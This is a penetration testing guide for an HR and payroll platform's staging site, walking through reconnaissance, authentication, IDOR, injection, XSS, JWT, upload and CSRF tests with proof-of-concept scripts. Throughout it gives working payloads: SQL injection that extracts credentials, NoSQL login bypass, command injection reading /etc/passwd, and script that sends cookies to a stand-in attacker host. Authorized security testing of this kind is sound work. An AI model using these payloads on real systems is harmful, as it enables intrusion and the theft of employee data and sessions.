# Penetration Testing Guide - AuraOS HCM (Day 56)

Manual penetration testing procedures and exploitation techniques for the AuraOS HCM platform.

## 📋 Overview

This document outlines manual penetration testing procedures to complement automated security tests. It includes:
- **Reconnaissance** - Information gathering
- **Vulnerability Assessment** - Manual testing techniques
- **Exploitation** - Proof of concept exploits
- **Post-Exploitation** - Impact assessment
- **Reporting** - Documentation templates

## ⚠️ IMPORTANT: Legal and Ethical Considerations

**WARNING**: Only perform penetration testing on systems you own or have explicit written permission to test.

### Authorization Checklist
- [ ] Written authorization obtained
- [ ] Scope of testing clearly defined
- [ ] Timeframe agreed upon
- [ ] Emergency contacts identified
- [ ] Rules of engagement documented
- [ ] Non-disclosure agreement signed

### Testing Environment
- ✅ Use dedicated testing/staging environment
- ❌ **NEVER** test on production without approval
- ✅ Maintain detailed logs of all activities
- ✅ Have rollback plan ready

---

## 🎯 Penetration Testing Scope

### In-Scope Targets
- Web application: https://staging.auraos.com
- API endpoints: https://api.staging.auraos.com
- Mobile web interface
- Admin portal

### Out-of-Scope
- Production environment
- Physical security testing
- Social engineering (unless explicitly authorized)
- Denial of Service attacks
- Third-party services

---

## 🔍 Phase 1: Reconnaissance (Information Gathering)

### 1.1 Passive Reconnaissance

**Objective**: Gather publicly available information without directly interacting with the target.

```bash
# WHOIS lookup
whois auraos.com

# DNS enumeration
dig auraos.com ANY
nslookup -type=any auraos.com

# Subdomain discovery
subfinder -d auraos.com
amass enum -d auraos.com

# Certificate transparency logs
curl -s "https://crt.sh/?q=%.auraos.com&output=json" | jq .

# Google dorking
site:auraos.com
site:auraos.com filetype:pdf
site:auraos.com inurl:admin
site:auraos.com intext:"password"
```

**Findings to Document**:
- Subdomains discovered
- Email addresses
- Technologies used
- Exposed documents
- Employee information

### 1.2 Active Reconnaissance

**Objective**: Directly interact with the target to discover attack surface.

```bash
# Port scanning
nmap -sV -p- staging.auraos.com

# Web server fingerprinting
whatweb https://staging.auraos.com
wafw00f https://staging.auraos.com

# Technology detection
wappalyzer https://staging.auraos.com

# Directory/file enumeration
gobuster dir -u https://staging.auraos.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# API endpoint discovery
ffuf -u https://api.staging.auraos.com/FUZZ -w api-wordlist.txt

# JavaScript file analysis
python3 linkfinder.py -i https://staging.auraos.com/app.js -o cli
```

**Attack Surface Map**:
```
├── Authentication
│   ├── /login
│   ├── /register
│   ├── /forgot-password
│   └── /reset-password
├── API Endpoints
│   ├── /api/auth/*
│   ├── /api/employees/*
│   ├── /api/payroll/*
│   └── /api/admin/*
├── File Upload
│   └── /api/documents/upload
└── Admin Panel
    └── /admin/*
```

---

## 🎯 Phase 2: Vulnerability Assessment

### 2.1 Authentication Testing

#### Test 1: Username Enumeration

**Objective**: Determine if valid usernames can be discovered.

```bash
# Test with valid email
POST /api/auth/login
{
  "email": "admin@auraos.com",
  "password": "wrongpassword"
}

# Expected: Generic error message
# Vulnerable: "Invalid password" (confirms username exists)
# Secure: "Invalid credentials"

# Timing attack
time curl -X POST https://staging.auraos.com/api/auth/login \
  -d '{"email":"admin@auraos.com","password":"wrong"}'

time curl -X POST https://staging.auraos.com/api/auth/login \
  -d '{"email":"nonexistent@test.com","password":"wrong"}'

# If timing differs significantly, username enumeration is possible
```

**✅ PASS**: Generic error message, consistent timing
**❌ FAIL**: Different messages or timing for valid/invalid users

---

#### Test 2: Brute Force Protection

**Objective**: Test account lockout mechanism.

```bash
# Attempt multiple failed logins
for i in {1..10}; do
  curl -X POST https://staging.auraos.com/api/auth/login \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"admin@auraos.com\",\"password\":\"attempt$i\"}"
  sleep 1
done

# After 5 attempts, account should be locked
```

**✅ PASS**: Account locked after 5 failed attempts
**❌ FAIL**: Unlimited login attempts allowed

---

#### Test 3: Password Reset Token Prediction

**Objective**: Test if password reset tokens are predictable.

```bash
# Request password reset multiple times
for i in {1..5}; do
  curl -X POST https://staging.auraos.com/api/auth/forgot-password \
    -d '{"email":"test@auraos.com"}'
done

# Collect tokens from email
# Analyze for patterns:
# - Sequential numbers
# - Timestamp-based
# - Weak randomness
```

**✅ PASS**: Cryptographically random tokens (UUID v4, 32+ char random)
**❌ FAIL**: Predictable or short tokens

---

### 2.2 Authorization Testing (IDOR/Privilege Escalation)

#### Test 4: Horizontal Privilege Escalation (IDOR)

**Objective**: Access other users' data.

```bash
# Login as Employee A (ID: 123)
TOKEN_A="employee_a_token"

# Try to access Employee B's data (ID: 124)
curl -X GET https://staging.auraos.com/api/employees/124 \
  -H "Authorization: Bearer $TOKEN_A"

# Expected: 403 Forbidden
# Vulnerable: 200 OK with Employee B's data

# Test with different endpoints
/api/employees/124/payslips
/api/employees/124/leave
/api/employees/124/attendance
```

**✅ PASS**: 403 Forbidden
**❌ FAIL**: Access granted to other employee's data

---

#### Test 5: Vertical Privilege Escalation

**Objective**: Access admin functionality as regular employee.

```bash
# Login as regular employee
TOKEN_EMP="employee_token"

# Try to access admin endpoints
curl -X GET https://staging.auraos.com/api/admin/users \
  -H "Authorization: Bearer $TOKEN_EMP"

# Try to modify another user's role
curl -X PATCH https://staging.auraos.com/api/employees/123 \
  -H "Authorization: Bearer $TOKEN_EMP" \
  -d '{"role":"admin"}'

# Try to approve own leave
curl -X POST https://staging.auraos.com/api/leave/456/approve \
  -H "Authorization: Bearer $TOKEN_EMP"
```

**✅ PASS**: All requests return 403 Forbidden
**❌ FAIL**: Employee can access admin functions

---

### 2.3 Injection Testing

#### Test 6: SQL Injection

**Objective**: Inject SQL commands through user inputs.

```bash
# Test in search functionality
curl "https://staging.auraos.com/api/employees/search?q=' OR '1'='1"

# Test in login
curl -X POST https://staging.auraos.com/api/auth/login \
  -d '{"email":"admin@auraos.com' OR '1'='1","password":"anything"}'

# Boolean-based blind SQLi
curl "https://staging.auraos.com/api/employees/search?q=test' AND 1=1--"
curl "https://staging.auraos.com/api/employees/search?q=test' AND 1=2--"

# Time-based blind SQLi
curl "https://staging.auraos.com/api/employees/search?q=test' AND SLEEP(5)--"

# Union-based SQLi
curl "https://staging.auraos.com/api/employees/search?q=test' UNION SELECT null,username,password FROM users--"
```

**✅ PASS**: All queries return normal results or errors
**❌ FAIL**: SQL errors, timing differences, or unexpected data

---

#### Test 7: NoSQL Injection

**Objective**: Inject NoSQL operators.

```bash
# Test login bypass
curl -X POST https://staging.auraos.com/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":{"$ne":null},"password":{"$ne":null}}'

# Test in search
curl -X POST https://staging.auraos.com/api/employees/search \
  -d '{"name":{"$gt":""}}'

# Test regex injection
curl -X POST https://staging.auraos.com/api/employees/search \
  -d '{"email":{"$regex":".*"}}'
```

**✅ PASS**: Invalid input rejected
**❌ FAIL**: Authentication bypassed or unauthorized data access

---

#### Test 8: Command Injection

**Objective**: Execute system commands.

```bash
# Test in file processing
curl -X POST https://staging.auraos.com/api/documents/upload \
  -F "file=@test.pdf; ping -c 10 attacker.com |"

# Test in export functionality
curl "https://staging.auraos.com/api/reports/export?filename=report.pdf; cat /etc/passwd"

# Test with various payloads
; ls -la
| cat /etc/passwd
`whoami`
$(whoami)
& ping -c 5 attacker.com &
```

**✅ PASS**: Special characters escaped or rejected
**❌ FAIL**: Command executed (check server logs or network traffic)

---

### 2.4 Cross-Site Scripting (XSS) Testing

#### Test 9: Reflected XSS

**Objective**: Inject JavaScript that executes immediately.

```bash
# Test in search functionality
https://staging.auraos.com/search?q=<script>alert('XSS')</script>

# Test in error messages
https://staging.auraos.com/error?message=<img src=x onerror=alert('XSS')>

# Advanced payloads
<svg onload=alert('XSS')>
<iframe src="javascript:alert('XSS')">
<body onload=alert('XSS')>
<img src=x onerror="fetch('https://attacker.com/?cookie='+document.cookie)">
```

**✅ PASS**: Payload appears as plain text
**❌ FAIL**: JavaScript executes

---

#### Test 10: Stored XSS

**Objective**: Store malicious script that affects other users.

```bash
# Test in employee profile
curl -X PATCH https://staging.auraos.com/api/employees/123 \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"bio":"<script>alert(\"XSS\")</script>"}'

# Test in leave comments
curl -X POST https://staging.auraos.com/api/leave/456/comment \
  -d '{"comment":"<img src=x onerror=alert(1)>"}'

# Test in announcements
curl -X POST https://staging.auraos.com/api/announcements \
  -d '{"title":"Alert","body":"<script>document.location=\"https://attacker.com/?c=\"+document.cookie</script>"}'
```

**✅ PASS**: HTML/JS sanitized or escaped
**❌ FAIL**: Script stored and executes for other users

---

### 2.5 Business Logic Testing

#### Test 11: Salary Manipulation

**Objective**: Modify own salary without authorization.

```bash
# Login as employee
TOKEN="employee_token"

# Try to update own salary
curl -X PATCH https://staging.auraos.com/api/employees/me \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"salary":1000000}'

# Try indirect manipulation through payroll
curl -X POST https://staging.auraos.com/api/payroll/override \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"employeeId":"123","salary":1000000}'
```

**✅ PASS**: 403 Forbidden
**❌ FAIL**: Salary updated successfully

---

#### Test 12: Leave Balance Manipulation

**Objective**: Modify leave balance.

```bash
# Try to directly update leave balance
curl -X PATCH https://staging.auraos.com/api/employees/me/leave-balance \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"annualLeave":999}'

# Try to apply for more leave than available
curl -X POST https://staging.auraos.com/api/leave/apply \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"startDate":"2025-01-01","endDate":"2025-12-31","type":"Annual"}'

# Try negative day calculation
curl -X POST https://staging.auraos.com/api/leave/apply \
  -d '{"startDate":"2025-12-31","endDate":"2025-01-01","type":"Annual"}'
```

**✅ PASS**: Validation prevents manipulation
**❌ FAIL**: Balance manipulated or excessive leave approved

---

#### Test 13: Attendance Fraud

**Objective**: Manipulate attendance records.

```bash
# Try to clock in with past timestamp
curl -X POST https://staging.auraos.com/api/attendance/clock-in \
  -d '{"timestamp":"2025-01-01T08:00:00Z"}'

# Try to clock in from different location (if GPS tracked)
curl -X POST https://staging.auraos.com/api/attendance/clock-in \
  -d '{"lat":0.0,"lng":0.0}'

# Try to modify existing attendance
curl -X PATCH https://staging.auraos.com/api/attendance/123 \
  -d '{"clockIn":"08:00","clockOut":"18:00"}'

# Try to clock in multiple times
for i in {1..5}; do
  curl -X POST https://staging.auraos.com/api/attendance/clock-in
done
```

**✅ PASS**: Fraudulent attempts rejected
**❌ FAIL**: Attendance manipulated

---

### 2.6 Session & Token Testing

#### Test 14: JWT Token Manipulation

**Objective**: Modify JWT token to escalate privileges.

```bash
# Capture JWT token
TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiIxMjMiLCJyb2xlIjoiZW1wbG95ZWUifQ.xxx"

# Decode JWT (using jwt.io or)
echo "eyJ1c2VySWQiOiIxMjMiLCJyb2xlIjoiZW1wbG95ZWUifQ" | base64 -d
# {"userId":"123","role":"employee"}

# Modify role to admin
NEW_PAYLOAD=$(echo '{"userId":"123","role":"admin"}' | base64)

# Test 1: None algorithm attack
# Change header to {"alg":"none"}
curl -X GET https://staging.auraos.com/api/admin/users \
  -H "Authorization: Bearer eyJhbGciOiJub25lIn0.$NEW_PAYLOAD."

# Test 2: Weak secret brute force
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt

# Test 3: Algorithm confusion (RS256 to HS256)
# If server public key is known, sign with public key using HS256
```

**✅ PASS**: Modified token rejected
**❌ FAIL**: Modified token accepted

---

#### Test 15: Session Fixation

**Objective**: Force user to use attacker-controlled session.

```bash
# 1. Attacker obtains session ID
ATTACKER_SESSION="abc123"

# 2. Victim clicks malicious link
https://staging.auraos.com/login?session_id=abc123

# 3. Victim logs in
# POST /api/auth/login (with session_id=abc123)

# 4. Attacker uses same session
curl https://staging.auraos.com/api/employees/me \
  -b "session_id=abc123"
```

**✅ PASS**: Session regenerated on login
**❌ FAIL**: Attacker gains access to victim's session

---

### 2.7 File Upload Testing

#### Test 16: Malicious File Upload

**Objective**: Upload executable files or web shells.

```bash
# Test 1: Upload executable
curl -X POST https://staging.auraos.com/api/documents/upload \
  -F "file=@shell.php"

curl -X POST https://staging.auraos.com/api/documents/upload \
  -F "file=@malware.exe"

# Test 2: Bypass extension filter
curl -X POST https://staging.auraos.com/api/documents/upload \
  -F "file=@shell.php.jpg"

curl -X POST https://staging.auraos.com/api/documents/upload \
  -F "file=@shell.pHp"  # Case variation

# Test 3: Double extension
curl -X POST https://staging.auraos.com/api/documents/upload \
  -F "file=@document.pdf.php"

# Test 4: Null byte injection
curl -X POST https://staging.auraos.com/api/documents/upload \
  -F "file=@shell.php%00.jpg"

# Test 5: MIME type bypass
curl -X POST https://staging.auraos.com/api/documents/upload \
  -F "file=@shell.php;type=image/jpeg"

# Test 6: Path traversal
curl -X POST https://staging.auraos.com/api/documents/upload \
  -F "file=@../../../../../../var/www/shell.php"
```

**✅ PASS**: Only whitelisted file types accepted, virus scanned
**❌ FAIL**: Executable uploaded and accessible

---

### 2.8 CSRF Testing

#### Test 17: Cross-Site Request Forgery

**Objective**: Force authenticated user to perform unwanted actions.

Create malicious HTML page:
```html
<!-- csrf-poc.html -->
<!DOCTYPE html>
<html>
<body>
  <h1>Click to win a prize!</h1>
  <form id="csrf" action="https://staging.auraos.com/api/employees/me" method="POST">
    <input type="hidden" name="salary" value="1000000">
    <input type="hidden" name="role" value="admin">
  </form>
  <script>
    document.getElementById('csrf').submit();
  </script>
</body>
</html>
```

**Test Steps**:
1. Login to staging.auraos.com
2. Open csrf-poc.html in same browser
3. Check if action was performed

**✅ PASS**: Request blocked (CSRF token required)
**❌ FAIL**: Action performed without CSRF token

---

## 🔨 Phase 3: Exploitation

### Proof of Concept Exploits

Only create PoC exploits to demonstrate impact - never cause actual damage.

#### PoC 1: SQL Injection Data Exfiltration

```python
import requests

url = "https://staging.auraos.com/api/employees/search"

# Extract database name
payload = "' UNION SELECT database(),null,null--"
response = requests.get(f"{url}?q={payload}")
print(response.json())

# Extract table names
payload = "' UNION SELECT table_name,null,null FROM information_schema.tables--"
response = requests.get(f"{url}?q={payload}")
print(response.json())

# Extract employee data
payload = "' UNION SELECT id,email,password FROM employees--"
response = requests.get(f"{url}?q={payload}")
print(response.json())
```

#### PoC 2: Authentication Bypass

```python
import requests

url = "https://staging.auraos.com/api/auth/login"

# NoSQL injection
payload = {
    "email": {"$ne": null},
    "password": {"$ne": null}
}

response = requests.post(url, json=payload)

if response.status_code == 200:
    token = response.json()['token']
    print(f"Authentication bypassed! Token: {token}")
```

#### PoC 3: Stored XSS Cookie Stealer

```javascript
// Inject into employee profile bio
<script>
fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>

// When admin views employee profile, their session cookie is sent to attacker
```

---

## 📊 Phase 4: Reporting

### Vulnerability Report Template

```markdown
# Vulnerability Report: [Title]

## Summary
Brief description of the vulnerability

## Severity
🔴 Critical / 🟠 High / 🟡 Medium / 🟢 Low

## CVSS Score
Base Score: X.X (Vector String)

## Affected Components
- Component 1
- Component 2

## Description
Detailed technical description

## Steps to Reproduce
1. Step 1
2. Step 2
3. Step 3

## Proof of Concept
Code or screenshots demonstrating the vulnerability

## Impact
What an attacker could achieve

## Remediation
How to fix the vulnerability

## References
- OWASP link
- CWE link
```

### Example Report

```markdown
# Vulnerability Report: SQL Injection in Employee Search

## Summary
The employee search functionality is vulnerable to SQL injection, allowing attackers to extract sensitive data from the database.

## Severity
🔴 Critical

## CVSS Score
Base Score: 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

## Affected Components
- `/api/employees/search` endpoint
- Employee search functionality

## Description
The application constructs SQL queries using string concatenation with unsanitized user input from the 'q' parameter.

## Steps to Reproduce
1. Navigate to employee search
2. Enter: `' OR '1'='1--`
3. Observe all employee records are returned

## Proof of Concept
\`\`\`bash
curl "https://staging.auraos.com/api/employees/search?q=' UNION SELECT id,email,password FROM employees--"
\`\`\`

## Impact
- Complete database compromise
- Extraction of all employee PII
- Exposure of password hashes
- Potential for database modification/deletion

## Remediation
Use parameterized queries or ORM:
\`\`\`typescript
const employees = await prisma.employee.findMany({
  where: { name: { contains: searchTerm } }
});
\`\`\`

## References
- https://owasp.org/www-community/attacks/SQL_Injection
- CWE-89: SQL Injection
```

---

## 📋 Penetration Test Checklist

### Authentication & Session Management
- [ ] Username enumeration
- [ ] Brute force protection
- [ ] Password complexity requirements
- [ ] Password reset token security
- [ ] Session timeout
- [ ] Session fixation
- [ ] Concurrent session limits
- [ ] Logout functionality
- [ ] JWT token security

### Authorization
- [ ] Horizontal privilege escalation (IDOR)
- [ ] Vertical privilege escalation
- [ ] Role-based access control
- [ ] Direct object references
- [ ] Mass assignment

### Input Validation
- [ ] SQL injection
- [ ] NoSQL injection
- [ ] Command injection
- [ ] LDAP injection
- [ ] XPath injection
- [ ] Template injection
- [ ] SSRF

### XSS & Client-Side
- [ ] Reflected XSS
- [ ] Stored XSS
- [ ] DOM-based XSS
- [ ] CSRF
- [ ] Clickjacking
- [ ] Open redirect

### Data Security
- [ ] Sensitive data in transit (HTTPS)
- [ ] Sensitive data at rest (encryption)
- [ ] Password storage (bcrypt)
- [ ] PII handling
- [ ] Secure file upload
- [ ] Secure file download

### Business Logic
- [ ] Salary manipulation
- [ ] Leave balance tampering
- [ ] Attendance fraud
- [ ] Payroll calculation errors
- [ ] Multi-tenancy isolation

### API Security
- [ ] Rate limiting
- [ ] API authentication
- [ ] API authorization
- [ ] Mass assignment
- [ ] Excessive data exposure

### Configuration
- [ ] Security headers
- [ ] TLS configuration
- [ ] Error messages
- [ ] Directory listing
- [ ] Default credentials

---

## 🎯 Success Criteria

A successful penetration test should:
- ✅ Identify all critical and high-severity vulnerabilities
- ✅ Provide proof-of-concept exploits (safely)
- ✅ Document findings with remediation steps
- ✅ Verify automated test coverage
- ✅ Present findings to development team

---

**Document Version**: 1.0
**Last Updated**: Day 56 - Penetration Testing
**Tester**: Security Team
**Next Test**: Quarterly or after major releases
